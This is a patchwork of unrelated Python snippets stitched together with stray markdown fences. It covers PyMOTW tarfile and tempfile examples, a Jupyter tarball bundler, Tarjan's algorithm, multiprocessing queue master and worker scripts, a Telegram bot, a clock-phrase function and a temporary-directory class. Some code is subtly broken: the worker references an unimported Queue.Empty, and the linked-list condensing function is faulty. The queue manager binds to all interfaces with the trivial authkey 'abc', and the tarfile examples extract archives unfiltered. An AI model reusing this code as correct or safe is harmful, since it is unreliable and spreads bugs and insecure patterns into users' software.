def _jupyter_bundlerextension_paths():
    """Metadata for notebook bundlerextension"""
    return [{
        # unique bundler name
        "name": "tarball_bundler",
        # module containing bundle function
        "module_name": "notebook.bundler.tarball_bundler",
        # human-readable menu item label
        "label" : "Notebook Tarball (tar.gz)",
        # group under 'deploy' or 'download' menu
        "group" : "download",
    }]

def bundle(handler, model):
    """Create a compressed tarball containing the notebook document.

    Parameters
    ----------
    handler : tornado.web.RequestHandler
        Handler that serviced the bundle request
    model : dict
        Notebook model from the configured ContentManager
    """
    notebook_filename = model['name']
    notebook_content = nbformat.writes(model['content']).encode('utf-8')
    notebook_name = os.path.splitext(notebook_filename)[0]
    tar_filename = '{}.tar.gz'.format(notebook_name)

    info = tarfile.TarInfo(notebook_filename)
    info.size = len(notebook_content)

    with io.BytesIO() as tar_buffer:
        with tarfile.open(tar_filename, "w:gz", fileobj=tar_buffer) as tar:
            tar.addfile(info, io.BytesIO(notebook_content))

        handler.set_attachment_header(tar_filename)
        handler.set_header('Content-Type', 'application/gzip')

        # Return the buffer value as the response
        handler.finish(tar_buffer.getvalue())

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile

print('creating archive')
with tarfile.open('tarfile_add.tar', mode='w') as out:
    print('adding README.txt')
    out.add('README.txt')

print()
print('Contents:')
with tarfile.open('tarfile_add.tar', mode='r') as t:
    for member_info in t.getmembers():
        print(member_info.name)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile

print('creating archive')
with tarfile.open('tarfile_addfile.tar', mode='w') as out:
    print('adding README.txt as RENAMED.txt')
    info = out.gettarinfo('README.txt', arcname='RENAMED.txt')
    out.addfile(info)

print()
print('Contents:')
with tarfile.open('tarfile_addfile.tar', mode='r') as t:
    for member_info in t.getmembers():
        print(member_info.name)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import io
import tarfile

text = 'This is the data to write to the archive.'
data = text.encode('utf-8')

with tarfile.open('addfile_string.tar', mode='w') as out:
    info = tarfile.TarInfo('made_up_file.txt')
    info.size = len(data)
    out.addfile(info, io.BytesIO(data))

print('Contents:')
with tarfile.open('addfile_string.tar', mode='r') as t:
    for member_info in t.getmembers():
        print(member_info.name)
        f = t.extractfile(member_info)
        print(f.read().decode('utf-8'))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile

print('creating archive')
with tarfile.open('tarfile_append.tar', mode='w') as out:
    out.add('README.txt')

print('contents:',)
with tarfile.open('tarfile_append.tar', mode='r') as t:
    print([m.name for m in t.getmembers()])

print('adding index.rst')
with tarfile.open('tarfile_append.tar', mode='a') as out:
    out.add('index.rst')

print('contents:',)
with tarfile.open('tarfile_append.tar', mode='r') as t:
    print([m.name for m in t.getmembers()])

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile
import os

fmt = '{:<30} {:<10}'
print(fmt.format('FILENAME', 'SIZE'))
print(fmt.format('README.txt', os.stat('README.txt').st_size))

FILES = [
    ('tarfile_compression.tar', 'w'),
    ('tarfile_compression.tar.gz', 'w:gz'),
    ('tarfile_compression.tar.bz2', 'w:bz2'),
]

for filename, write_mode in FILES:
    with tarfile.open(filename, mode=write_mode) as out:
        out.add('README.txt')

    print(fmt.format(filename, os.stat(filename).st_size),
          end=' ')
    print([
        m.name
        for m in tarfile.open(filename, 'r:*').getmembers()
    ])

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile
import os

os.mkdir('outdir')
with tarfile.open('example.tar', 'r') as t:
    t.extract('README.txt', 'outdir')
print(os.listdir('outdir'))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile
import os

os.mkdir('outdir')
with tarfile.open('example.tar', 'r') as t:
    t.extractall('outdir')
print(os.listdir('outdir'))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile
import os

os.mkdir('outdir')
with tarfile.open('example.tar', 'r') as t:
    t.extractall('outdir',
                 members=[t.getmember('README.txt')],
                 )
print(os.listdir('outdir'))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile

with tarfile.open('example.tar', 'r') as t:
    for filename in ['README.txt', 'notthere.txt']:
        try:
            f = t.extractfile(filename)
        except KeyError:
            print('ERROR: Did not find {} in tar archive'.format(
                filename))
        else:
            print(filename, ':')
            print(f.read().decode('utf-8'))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile
import time

with tarfile.open('example.tar', 'r') as t:
    for filename in ['README.txt', 'notthere.txt']:
        try:
            info = t.getmember(filename)
        except KeyError:
            print('ERROR: Did not find {} in tar archive'.format(
                filename))
        else:
            print('{} is {:d} bytes'.format(
                info.name, info.size))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py



#end_pymotw_header
import tarfile
import time

with tarfile.open('example.tar', 'r') as t:
    for member_info in t.getmembers():
        print(member_info.name)
        print('  Modified:', time.ctime(member_info.mtime))
        print('  Mode    :', oct(member_info.mode))
        print('  Type    :', member_info.type)
        print('  Size    :', member_info.size, 'bytes')
        print()

```
---


```py


#end_pymotw_header
import tarfile

with tarfile.open('example.tar', 'r') as t:
    print(t.getnames())

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```


#end_pymotw_header
import tarfile

for filename in ['README.txt', 'example.tar',
                 'bad_example.tar', 'notthere.tar']:
    try:
        print('{:>15}  {}'.format(filename, tarfile.is_tarfile(
            filename)))
    except IOError as err:
        print('{:>15}  {}'.format(filename, err))

from collections import deque


def tarjan(g):
    """
    Tarjan's algo for finding strongly connected components in a directed graph

    Uses two main attributes of each node to track reachability, the index of that node within a component(index),
    and the lowest index reachable from that node(lowlink).

    We then perform a dfs of the each component making sure to update these parameters for each node and saving the
    nodes we visit on the way.

    If ever we find that the lowest reachable node from a current node is equal to the index of the current node then it
    must be the root of a strongly connected component and so we save it and it's equireachable vertices as a strongly
    connected component.

    Complexity: strong_connect() is called at most once for each node and has a complexity of O(|E|) as it is DFS.
    Therefore this has complexity O(|V| + |E|) for a graph G = (V, E)

    """

    n = len(g)
    stack = deque()
    on_stack = [False for _ in range(n)]
    index_of = [-1 for _ in range(n)]
    lowlink_of = index_of[:]

    def strong_connect(v, index, components):
        index_of[v] = index  # the number when this node is seen
        lowlink_of[v] = index  # lowest rank node reachable from here
        index += 1
        stack.append(v)
        on_stack[v] = True

        for w in g[v]:
            if index_of[w] == -1:
                index = strong_connect(w, index, components)
                lowlink_of[v] = lowlink_of[w] if lowlink_of[w] < lowlink_of[v] else lowlink_of[v]
            elif on_stack[w]:
                lowlink_of[v] = lowlink_of[w] if lowlink_of[w] < lowlink_of[v] else lowlink_of[v]

        if lowlink_of[v] == index_of[v]:
            component = []
            w = stack.pop()
            on_stack[w] = False
            component.append(w)
            while w != v:
                w = stack.pop()
                on_stack[w] = False
                component.append(w)
            components.append(component)
        return index

    components = []
    for v in range(n):
        if index_of[v] == -1:
            strong_connect(v, 0, components)

    return components


def create_graph(n, edges):
    g = [[] for _ in range(n)]
    for u, v in edges:
        g[u].append(v)
    return g


if __name__ == '__main__':
    # Test
    n_vertices = 7
    source = [0, 0, 1, 2, 3, 3, 4, 4, 6]
    target = [1, 3, 2, 0, 1, 4, 5, 6, 5]
    edges = [(u, v) for u, v in zip(source, target)]
    g = create_graph(n_vertices, edges)

    assert [[5], [6], [4], [3, 2, 1, 0]] == tarjan(g)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random, time, queue
from multiprocessing.managers import BaseManager

# :
task_queue = queue.Queue()
# :
result_queue = queue.Queue()

# BaseManagerQueueManager:
class QueueManager(BaseManager):
    pass


# Queue, callableQueue:
QueueManager.register("get_task_queue", callable=lambda: task_queue)
QueueManager.register("get_result_queue", callable=lambda: result_queue)
# 5000, 'abc':
manager = QueueManager(address=("", 5000), authkey=b"abc")
# Queue:
manager.start()
# Queue:
task = manager.get_task_queue()
result = manager.get_result_queue()
# :
for i in range(10):
    n = random.randint(0, 10000)
    print("Put task %d..." % n)
    task.put(n)
# result:
print("Try get results...")
for i in range(10):
    r = result.get(timeout=10)
    print("Result: %s" % r)
# :
manager.shutdown()
print("master exit.")

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time, sys
from multiprocessing.managers import BaseManager

# QueueManager:
class QueueManager(BaseManager):
    pass


# QueueManagerQueue，:
QueueManager.register("get_task_queue")
QueueManager.register("get_result_queue")

# task_master.py:
server_addr = "127.0.0.1"
print("Connect to server %s..." % server_addr)
# task_master.py:
m = QueueManager(address=(server_addr, 5000), authkey=b"abc")
# :
m.connect()
# Queue:
task = m.get_task_queue()
result = m.get_result_queue()
# task,result:
for i in range(10):
    try:
        n = task.get(timeout=1)
        print("run task %d * %d..." % (n, n))
        r = "%d * %d = %d" % (n, n, n * n)
        time.sleep(1)
        result.put(r)
    except Queue.Empty:
        print("task queue is empty.")
# :
print("worker exit.")

from heapq import heappush, heappop

# Tasks priority queue
# A task is a tuple of (priority, payload)
tasks = []
heappush(tasks, (30, "work out"))
heappush(tasks, (10, "wake up"))
heappush(tasks, (20, 0xCAFFE))
heappush(tasks, (20, "feed cat"))
heappush(tasks, (40, "write book"))

while tasks:
    _, payload = heappop(tasks)
    print(payload)


from telegram import *
from telegram.ext import *


bot= Bot("")#Api key of bot in the bracket
updater = Updater("API Key",use_context=True)
dispatcher =updater.dispatcher
#function for play_music
def test_function(update:Update,context:CallbackContext):
    bot.send_message(
        chat_id=update.effective_chat.id,
        text="tutorial link : https://www.youtube.com/watch?v=ugR8bY4hQ4M",
    )
start_value = CommandHandler('play_music',test_function)
dispatcher.add_handler(start_value)

#function for hello
def test_function1(update:Update,context:CallbackContext):
    bot.send_message(
        chat_id=update.effective_chat.id,
        text="Hello JI,how are you??",
    )
start_value = CommandHandler('Hello',test_function1)
dispatcher.add_handler(start_value)


updater.start_polling()
def tellTime(time_str):

    t = "It's "

    h, m = time_str.split(":")
    h = int(h)
    m = int(m)

    if (m % 5) >= 3:
        m = (m // 5) * 5 + 5
        if m == 60:
            m = 0
            h += 1
    else:
        m = (m // 5) * 5

    dh = {
        0: "twelve",
        1: "one",
        2: "two",
        3: "three",
        4: "four",
        5: "five",
        6: "six",
        7: "seven",
        8: "eight",
        9: "nine",
        10: "ten",
        11: "eleven",
        12: "twelve",
        13: "one",
    }

    dm = {
        5: "five",
        10: "ten",
        15: "quarter",
        20: "twenty",
        25: "twenty five",
        30: "half",
    }

    if m == 0:
        t += dh[h] + " o'clock"
    elif m < 31:
        h = h % 12
        t += dm[m] + " past " + dh[h]
    else:
        h += 1
        h = h % 12
        m = 60 - m
        t += dm[m] + " to " + dh[h]

    return t

# Singly-linked lists are already defined with this interface:
# class ListNode(object):
#   def __init__(self, x):
#     self.value = x
#     self.next = None
#
def condense_linked_list(node):

    head = node
    curr_node = head.next

    while curr_node is not None:
        if curr_node.value == head.value:

            curr_node = curr_node.next
            curr_node.next = None

        curr_node = curr_node.next
        head = head.next

    return head

    # curr_node = curr_node.next
    # print(curr_node.value)

    # if curr_node.value == head.value:

    # while tracker_node:
    #     print(tracker_node.value, "tracker")
    #     if tracker_node.value == curr_node.value:
    #         curr_node.next = tracker_node.next.next

    #     tracker_node = tracker_node.next

    # curr_node = curr_node.next

    # return curr_node

# importing the psutil library
import psutil

# Note: It is not for windows user

data = psutil.sensors_temperatures()
print("Current Temperature of CPU (celcius): ", data['coretemp'][0][1])

# coding: utf-8
from __future__ import absolute_import, division, print_function

import os as _os
import sys as _sys
import warnings as _warnings
from tempfile import mkdtemp


class TemporaryDirectory(object):
    """Create and return a temporary directory.  This has the same
    behavior as mkdtemp but can be used as a context manager.  For
    example:

        with TemporaryDirectory() as tmpdir:
            ...

    Upon exiting the context, the directory and everything contained
    in it are removed.
    """

    def __init__(self, suffix="", prefix="tmp", dir=None):
        self._closed = False
        self.name = None  # Handle mkdtemp raising an exception
        self.name = mkdtemp(suffix, prefix, dir)

    def __repr__(self):
        return "<{} {!r}>".format(self.__class__.__name__, self.name)

    def __enter__(self):
        return self.name

    def cleanup(self):
        if self.name and not self._closed:
            try:
                self._rmtree(self.name)
            except (TypeError, AttributeError) as ex:
                # Issue #10188: Emit a warning on stderr
                # if the directory could not be cleaned
                # up due to missing globals
                if "None" not in str(ex):
                    raise
                print(
                    "ERROR: {!r} while cleaning up {!r}".format(ex, self),
                    file=_sys.stderr,
                )
                return
            self._closed = True

    def __exit__(self, exc, value, tb):
        self.cleanup()

    def __del__(self):
        # Issue a ResourceWarning if implicit cleanup needed
        self.cleanup()

    # XXX (ncoghlan): The following code attempts to make
    # this class tolerant of the module nulling out process
    # that happens during CPython interpreter shutdown
    # Alas, it doesn't actually manage it. See issue #10188
    _listdir = staticmethod(_os.listdir)
    _path_join = staticmethod(_os.path.join)
    _isdir = staticmethod(_os.path.isdir)
    _islink = staticmethod(_os.path.islink)
    _remove = staticmethod(_os.remove)
    _rmdir = staticmethod(_os.rmdir)
    _warn = _warnings.warn

    def _rmtree(self, path):
        # Essentially a stripped down version of shutil.rmtree.  We can't
        # use globals because they may be None'ed out at shutdown.
        for name in self._listdir(path):
            fullname = self._path_join(path, name)
            try:
                isdir = self._isdir(fullname) and not self._islink(fullname)
            except OSError:
                isdir = False
            if isdir:
                self._rmtree(fullname)
            else:
                try:
                    self._remove(fullname)
                except OSError:
                    pass
        try:
            self._rmdir(path)
        except OSError:
            pass

#```











#end_pymotw_header
import os
import pathlib
import tempfile

with tempfile.NamedTemporaryFile() as temp:
    print('temp:')
    print('  {!r}'.format(temp))
    print('temp.name:')
    print('  {!r}'.format(temp.name))

    f = pathlib.Path(temp.name)

print('Exists after close:', f.exists())

```









---


```py



#end_pymotw_header
import tempfile

with tempfile.NamedTemporaryFile(suffix='_suffix',
                                 prefix='prefix_',
                                 dir='/tmp') as temp:
    print('temp:')
    print('  ', temp)
    print('temp.name:')
    print('  ', temp.name)

```









---


```py



#end_pymotw_header
import tempfile

with tempfile.SpooledTemporaryFile(max_size=100,
                                   mode='w+t',
                                   encoding='utf-8') as temp:
    print('temp: {!r}'.format(temp))

    for i in range(3):
        temp.write('This line is repeated over and over.\n')
        print(temp._rolled, temp._file)

```









---


```py



#end_pymotw_header
import tempfile

with tempfile.SpooledTemporaryFile(max_size=1000,
                                   mode='w+t',
                                   encoding='utf-8') as temp:
    print('temp: {!r}'.format(temp))

    for i in range(3):
        temp.write('This line is repeated over and over.\n')
        print(temp._rolled, temp._file)
    print('rolling over')
    temp.rollover()
    print(temp._rolled, temp._file)

```









---


```py



#end_pymotw_header
import pathlib
import tempfile

with tempfile.TemporaryDirectory() as directory_name:
    the_dir = pathlib.Path(directory_name)
    print(the_dir)
    a_file = the_dir / 'a_file.txt'
    a_file.write_text('This file is deleted.')

print('Directory exists after?', the_dir.exists())
print('Contents after:', list(the_dir.glob('*')))

```









---


```py



#end_pymotw_header
import os
import tempfile

print('Building a filename with PID:')
filename = '/tmp/guess_my_name.{}.txt'.format(os.getpid())
with open(filename, 'w+b') as temp:
    print('temp:')
    print('  {!r}'.format(temp))
    print('temp.name:')
    print('  {!r}'.format(temp.name))

# Clean up the temporary file yourself.
os.remove(filename)

print()
print('TemporaryFile:')
with tempfile.TemporaryFile() as temp:
    print('temp:')
    print('  {!r}'.format(temp))
    print('temp.name:')
    print('  {!r}'.format(temp.name))

# Automatically cleans up the file.

```









---


```py



#end_pymotw_header
import os
import tempfile

with tempfile.TemporaryFile() as temp:
    temp.write(b'Some data')

    temp.seek(0)
    print(temp.read())

```









---


```py



#end_pymotw_header
import tempfile

with tempfile.TemporaryFile(mode='w+t') as f:
    f.writelines(['first\n', 'second\n'])

    f.seek(0)
    for line in f:
        print(line.rstrip())

````
